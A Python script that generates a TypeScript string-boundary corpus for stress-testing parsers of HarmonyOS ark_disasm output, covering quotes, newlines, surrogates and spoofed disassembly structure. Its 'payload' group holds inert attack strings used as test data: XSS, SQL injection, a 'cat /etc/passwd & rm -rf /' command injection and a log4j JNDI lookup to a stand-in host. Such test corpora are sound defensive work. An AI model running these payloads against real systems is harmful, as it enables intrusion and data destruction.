#!/usr/bin/env python3
"""生成字符串边界压力源文件（feat_api/src/main/ets/pages/lang/StringStressLab.ts）。

背景（SDK26 es2abc + ark_disasm 实证，探针见 docs/BENCHMARK.md 对应轮次）：
ark_disasm 文本输出对字符串只做「部分转义」——反斜杠/控制字符/U+2028 等转成转义文本，
但 **双引号、换行 \\n、回车 \\r 原样裸输出**；代理对按 MUTF-8(CESU-8) 裸字节写出，
会使整个 .dis 文件不再是合法 UTF-8。下游按行/按引号切分的文本解析器因此存在结构性风险。

本语料把全部边界形态同时压入 ark_disasm 输出的三个解析面：
  ① METHODS 段指令操作数：lda.str "..."、stobjbyname/ldobjbyname "key"（引号配对被内嵌 " 破坏，
     内嵌 \\n 把后续内容伪装成指令行 / L_ESSlotNumberAnnotation: 方法边界 / # xx ==== 段分隔符）；
  ② LITERALS 段字面量：createarraywithbuffer/createobjectwithbuffer 的 string:"..."（同上 + 元素按逗号切分）；
  ③ STRING 段字符串池：[offset:0x.., name_value:裸值]（无引号；内嵌 \\n 换行重组，
     值内出现 "\\n[offset:" 会伪造下一条池条目，"# xx ====================" 会伪造段结束）。

用例分组：引号族 / 反斜杠族 / 换行回车族 / 转义文本与真实字符碰撞 / MUTF-8 与 Unicode /
池条目伪造 / 方法体伪造 / 段分隔伪造 / record 伪造 / 操作数分支矩阵（", 相邻、连引号、
字面 "\\ 序列、label/.catchall/.function 变体伪造）/ 超长 / 近重复（池去重+strip 边界）/
现实漏洞载荷（XSS、SQLi、log4j、HTTP CRLF 等）/ 乱炖组合。

指令面可达性说明（es2abc 实测）：字符串操作数指令中 lda.str / stobjbyname / ldobjbyname /
throw.undefinedifholewithname 可由语料定向触发；tryldglobalbyname/stglobalbyname 的操作数
只能是合法标识符（内容不可恶劣化）；newlexenvwithname 名字数组在当前 SDK 闭包形态下不可达
（闭包走无名 newlexenv），其 literal 数组解析路径由数组/对象字面量组等价覆盖。

用法：python3 tools/gen_string_stress.py   （在 ohosVulDetect 子模块根目录执行）
生成后由 pages/lang/RuntimeDemo.ets 挂载（防 tree-shake 并做运行时校验和验证）。
"""
import argparse
import pathlib

HEADER = "// 本文件由 tools/gen_string_stress.py 生成，勿手改。"

# ---------------- TS 字面量编码：内容 -> 双引号字面量源码 ----------------

def enc(s: str) -> str:
    """Python 内容串 -> TS 双引号字面量内部文本。
    控制字符/代理对/BOM/U+2028-9 输出为 \\uXXXX 转义（源码保持可读、可 diff）；
    其余非 ASCII（CJK/emoji 等）按字面输出——两种源码形态在 ark_disasm 输出侧行为不同，均需覆盖。"""
    out = []
    for ch in s:
        o = ord(ch)
        if ch == "\\":
            out.append("\\\\")
        elif ch == '"':
            out.append('\\"')
        elif ch == "\n":
            out.append("\\n")
        elif ch == "\r":
            out.append("\\r")
        elif ch == "\t":
            out.append("\\t")
        elif o < 0x20 or o == 0x7F or 0xD800 <= o <= 0xDFFF or o in (0xFEFF, 0x2028, 0x2029):
            out.append(f"\\u{o:04x}")
        else:
            out.append(ch)
    return "".join(out)


def build_cases() -> list[tuple[str, str]]:
    """(内容, 分组说明)。内容即运行期真实字符串。"""
    c: list[tuple[str, str]] = []
    add = lambda s, g: c.append((s, g))

    # ---- 基础边界 ----
    add("The quick brown fox jumps", "basic")
    add("", "basic")
    add(" ", "basic")
    add("   ", "basic")
    add("  padded  ", "basic")
    add("]", "basic")
    add("]}", "basic")
    add("] ] ]", "basic")

    # ---- 引号族：ark_disasm 不转义 " ----
    add('"', "quote")
    add('""', "quote")
    add('"""', "quote")
    add("'", "quote")
    add("`", "quote")
    add("\"'`", "quote")
    add('say "hi" ok', "quote")
    add("it's `tick`", "quote")
    add('"quoted"', "quote")
    add('{"k":"v","n":[1,2]}', "quote")
    add('select * from t where name=\'a\'\'b\' and c="d"', "quote")
    add('<a href="x" onclick=\'go("y")\'>', "quote")
    add('a"\nb\'\nc`', "quote")
    add('"' * 50, "quote")

    # ---- 反斜杠族：ark_disasm 会转义 \\，转义文本与真实字符需可区分 ----
    add("back\\slash", "backslash")
    add("double\\\\slash", "backslash")
    add("end\\", "backslash")
    add("a\\nb", "backslash")          # 内容=反斜杠+n 两字符
    add('a\\"b', "backslash")
    add("C:\\Users\\koki\\temp", "backslash")
    add("\\\\server\\share\\", "backslash")
    add("\\u0041", "backslash")
    add("\\x41", "backslash")
    add("\\${jndi}", "backslash")
    add('(\\d+)\\s*"[x]"', "backslash")
    add('\\n\\r\\t\\"\\\\', "backslash")

    # ---- 换行/回车族：\n \r 裸输出，行级解析器主要攻击面 ----
    add("line1\nline2", "newline")
    add("\nstart", "newline")
    add("end\n", "newline")
    add("\n\n\n", "newline")
    add("\n" * 100, "newline")
    add("cr\rmid", "newline")
    add("\rstart", "newline")
    add("end\r", "newline")
    add("crlf\r\nend", "newline")
    add("lf\n\rend", "newline")
    add("a\r\n\r\nb", "newline")
    add("a\n\t b\r\n c\n", "newline")

    # ---- 转义文本 vs 真实字符碰撞（round-trip 必须不混淆）----
    add("a\tb", "escape-collision")
    add("a\\tb", "escape-collision")
    add("a\x01b", "escape-collision")
    add("a\\x01b", "escape-collision")
    add("a\u2028b", "escape-collision")
    add("a\u2029b", "escape-collision")
    add("a\ufeffb", "escape-collision")
    add("a\x7fb", "escape-collision")
    add("a\\u2028b", "escape-collision")
    add("\x07\x0c\x0b", "escape-collision")
    add("\x1b[0m\x1b[31mRED\x1b[0m", "escape-collision")

    # ---- MUTF-8 / Unicode：代理对裸 CESU-8 字节 -> .dis 非法 UTF-8 ----
    add("中文测试汉字标点", "unicode")
    add("emoji😀🀄𝕏末", "unicode")
    add("x\ud800y", "unicode")            # 孤立高代理（源码必为转义形态）
    add("x\udfffy", "unicode")            # 孤立低代理
    add("\ud83d\ude00pair", "unicode")    # 转义形态的代理对
    add("e\u0301na\u0308ive", "unicode")
    add("a\u00a0b", "unicode")
    add("a\u200bb\u200dc", "unicode")
    add("evil\u202edrow-ssa\u202c", "unicode")
    add("“”‘’「」『』【】", "unicode")
    add("中“文”\n日『本』", "unicode")

    # ---- STRING 池条目伪造（值内 \n[offset: 伪造下一条；name_value: 前缀）----
    add("multi\n[offset:0x1, name_value:x]tail", "pool-spoof")
    add("\n[offset:0x9, name_value:zz]", "pool-spoof")
    add("head\n[offset:0x0, name_value:]", "pool-spoof")
    add("[offset:0x123, name_value:sink]", "pool-spoof")
    add("name_value:v", "pool-spoof")
    add("a, b: c, d: e", "pool-spoof")

    # ---- literal 起始行伪造（值内伪造 LITERALS 段条目形态，攻击 literal 分块与闭合扫描）----
    add('fake\n0 0x590 { 2 [ string:"x", null_value:0, ]}', "lit-spoof")
    add("fake\n1 0x1 { ", "lit-spoof")
    add('fake\n2 0x2 { 3 [ string:"m", method:f, method_affiliate:0, ]}', "lit-spoof")
    add("fake\n999999 0xdeadbeef { 999 [ ", "lit-spoof")

    # ---- METHODS 段伪造（\n 后伪造指令行 / 方法边界 / .function 头）----
    add("fake\nL_ESSlotNumberAnnotation:", "method-spoof")
    add("L_ESSlotNumberAnnotation:", "method-spoof")
    add("pre\n\tsta v0\n\tldai 0x0", "method-spoof")
    add('x\n\tlda.str "y"', "method-spoof")
    add('x\n\tldobjbyname 0x0, "k"', "method-spoof")
    add("pre\n.function any evil(any a0) {", "method-spoof")
    add("pre\n.language ECMAScript", "method-spoof")
    add("body\n}\nafter", "method-spoof")

    # ---- 段分隔符伪造（# xx ====... / endswith("====") 判定）----
    add("sec\n# STRING ====================", "section-spoof")
    add("sec\n# RECORDS ====================", "section-spoof")
    add("sec\n# ====================", "section-spoof")
    add("sec\n# LITERALS\n# METHODS", "section-spoof")
    add("x=====================y", "section-spoof")
    add("# LITERALS", "section-spoof")

    # ---- RECORDS 段伪造 ----
    add("rec\n.record evil {\n}", "record-spoof")
    add("fld\n.field any x, <0x1>", "record-spoof")

    # ---- 超长（行重组/缓冲）----
    add('q"b\\n\tr,' * 256, "long")
    add("汉" * 500, "long")
    add("%s" % ("ab" * 1024), "long")

    # ---- 近重复（池去重与首尾空白边界）----
    add("a", "near-dup")
    add("a", "near-dup")          # 完全重复：池应去重，操作数处重复
    add("a ", "near-dup")
    add(" a", "near-dup")
    add("a\n", "near-dup")
    add("aa", "near-dup")

    # ---- 现实漏洞载荷（兼顾漏洞检测侧语料）----
    add('<img src=x onerror="alert(\'XSS\')">', "payload")
    add("1' OR '1'='1' --", "payload")
    add("; cat /etc/passwd & rm -rf /", "payload")
    add("../../etc/passwd%00.png", "payload")
    add("${jndi:ldap://evil.x/a}", "payload")
    add("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpM", "payload")
    add('https://x.io/a?b=1&c="d"&e=\'f\'', "payload")
    add("Failed %{public}s cause: %{public}s", "payload")
    add('<?xml v="1.0"?><n a="b\'c"/>', "payload")
    add('k: "v"\n  - \'w\'\n# cmt', "payload")
    add('HTTP/1.1 200 OK\r\nSet-Cookie: a="b"\r\n\r\nbody', "payload")
    add('# Title\n> quote "x"\n- item `y`\n', "payload")
    add("0K5t9qQ2Xz7vBn4hR8wL3jF6uM1cA7dE5gT+4iY0sP==", "payload")

    # ---- 操作数分支矩阵：", 相邻 / 连引号 / 字面转义序列 / label 与 catchall 伪造 ----
    # 针对下游 find_next_delimiter 类函数的引号配对分支：", lookahead 特判、连引号特判、
    # 字面 "\ 序列特判，以及方法段 label/.catchall/.function 变体伪造。
    add('", lead', "operand-branch")
    add('trail ,"', "operand-branch")
    add('a ," b', "operand-branch")
    add('",', "operand-branch")
    add('""""', "operand-branch")
    add('"""""', "operand-branch")
    add('""""""', "operand-branch")
    add('"\\"', "operand-branch")            # 内容 = " \ " 三字符（引号+反斜杠+引号）
    add('""\\"""', "operand-branch")         # 内容 = " " \ " " 五字符
    add('"\\\\"', "operand-branch")          # 内容 = " \ \ " 四字符
    add('pre\njump_label_0:', "operand-branch")
    add('x\njump_label_1:\npost', "operand-branch")
    add('body\n.catchall\nmore', "operand-branch")
    add('pre\n.function any n.e.f(any a0) <static> {', "operand-branch")
    add('pre\n.function any f(any a0, any a1) {', "operand-branch")
    add('lab\n\tldai 0x1\n\tjnez jump_label_9', "operand-branch")

    # ---- 乱炖组合 ----
    add('{"k":"v"}\n# STRING ====================\n😀tail', "combo")
    add("multi\n[offset:0x1, name_value:x]\r\nevil\u202ex\u202c", "combo")
    add('a"b\\c\td\ne\rf"g`h', "combo")
    return c


# 对象字面量键位子集：键需唯一，取最具破坏力的形态（引号/换行/池伪造/全角等）
KEY_SUBSET_GROUPS = ("quote", "newline", "pool-spoof", "section-spoof", "unicode", "backslash")


def pick_keys(cases: list[tuple[str, str]]) -> list[str]:
    seen: set[str] = set()
    keys: list[str] = []
    for content, group in cases:
        if group not in KEY_SUBSET_GROUPS or content in seen or not content:
            continue
        seen.add(content)
        keys.append(content)
        if len(keys) >= 24:
            break
    if len(keys) < 8:  # 理论不可达，防御
        raise RuntimeError("nasty key subset too small")
    return keys


def gen(out: pathlib.Path) -> int:
    cases = build_cases()
    keys = pick_keys(cases)
    n = len(cases)

    def ts(i: int) -> str:
        return f'"{enc(cases[i][0])}"'

    lines: list[str] = [
        HEADER,
        "// 字符串边界语料：把引号/换行/回车/代理对/伪造 ark_disasm 文本结构等全部边界形态",
        "// 同时压入三个解析面：方法体指令操作数（lda.str / stobjbyname）、字面量缓冲",
        "// （createarraywithbuffer / createobjectwithbuffer 的键与值）、字符串池。",
        f"// 共 {n} 个用例；预期故障模式与实证依据见 tools/gen_string_stress.py 文档字符串。",
        f"export const STRING_STRESS_CASES: number = {n};",
        "",
        "// 面①：方法体 lda.str 操作数（含全部用例）。",
        "export function stringStressAt(i: number): string {",
    ]
    for i in range(n):
        lines.append(f"  if (i === {i}) {{ return {ts(i)}; }}")
    lines += [
        '  return "string-stress-fallback";',
        "}",
        "",
        "// 面②a：数组字面量缓冲（含全部用例）。",
        "export function stringStressArray(): Array<string> {",
        "  return [",
    ]
    for i in range(n):
        lines.append(f"    {ts(i)},")
    lines += [
        "  ];",
        "}",
        "",
        "// 面②b：对象字面量缓冲（恶劣键位子集 + 值），键与值都进字面量段。",
        "export function stringStressObject(): Record<string, string> {",
        "  return {",
    ]
    for k in range(len(keys)):
        v = f'"k{chr(97 + k % 26)}{k}v"'
        key_txt = f'"{enc(keys[k])}"'
        lines.append(f"    {key_txt}: {v},")
    lines += [
        "  };",
        "}",
        "",
        "// 面①补：stobjbyname/ldobjbyname 的字符串操作数（动态键读写，覆盖 \", 相邻与连引号键）。",
        "export function stringStressFields(): string {",
        '  const o: Record<string, string> = {};',
        '  o[\'a"b\'] = \'v"x\';',
        "  o['k\\\\n'] = 'v\\\\y';",
        "  o['k\\n'] = 'v\\nz';",
        '  o["[offset:0x1, name_value:x]"] = "pool";',
        "  o[',k'] = 'comma-key';",
        "  o['\"\"\"\"'] = 'quad-key';",
        "  o['jump_label_0:'] = 'label-key';",
        "  o['.catchall'] = 'catchall-key';",
        "  let s = '';",
        "  for (const k in o) {",
        "    s += k.length > 0 ? o[k] : '';",
        "  }",
        "  return s + o[',k'] + o['jump_label_0:'];",
        "}",
        "",
        "// 面①补：throw.undefinedifholewithname（捕获变量洞检查，单字符串操作数形态）。",
        "export function stringStressLexenv(base: number): number {",
        "  const a = base + 1;",
        "  const b = base + 2;",
        "  const c = base + 3;",
        "  const pick = (): number => a + b + c;",
        "  return pick();",
        "}",
        "",
        "// 模板字面量块（含引号/换行/制表/反斜杠块 + 插值）。",
        "export function stringStressTpl(seed: number): string {",
        '  return `head "q"\\nmid\\t${seed}tail\\\\end\\r`;',
        "}",
        "",
        "// 运行时校验和：遍历全部形态，返回 计数/总长/字符码累加（值正确性由 sweep ✅ 行核对）。",
        "export function stringStressChecksum(): string {",
        "  const arr = stringStressArray();",
        "  const obj = stringStressObject();",
        "  let cnt = 0;",
        "  let len = 0;",
        "  let acc = 0;",
        "  for (const s of arr) {",
        "    cnt += 1;",
        "    len += s.length;",
        "    for (let j = 0; j < s.length; j++) {",
        "      acc = (acc + s.charCodeAt(j) * (j % 7 + 1)) % 1000000007;",
        "    }",
        "  }",
        "  for (const k in obj) {",
        "    cnt += 1;",
        "    len += k.length + obj[k].length;",
        "  }",
        "  for (let i = 0; i < STRING_STRESS_CASES; i++) {",
        "    cnt += 1;",
        "    len += stringStressAt(i).length;",
        "  }",
        "  len += stringStressFields().length;",
        "  len += stringStressLexenv(cnt);",
        "  len += stringStressTpl(cnt).length;",
        "  return `n=${cnt} len=${len} acc=${acc}`;",
        "}",
        "",
    ]
    out.write_text("\n".join(lines), encoding="utf-8")
    return n


def main() -> int:
    ap = argparse.ArgumentParser(description="generate string boundary stress source")
    ap.add_argument("--outdir", default="feat_api/src/main/ets/pages/lang", help="输出目录（相对子模块根）")
    args = ap.parse_args()
    outdir = pathlib.Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    n = gen(outdir / "StringStressLab.ts")
    print(f"generated: {outdir / 'StringStressLab.ts'} (cases={n})")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
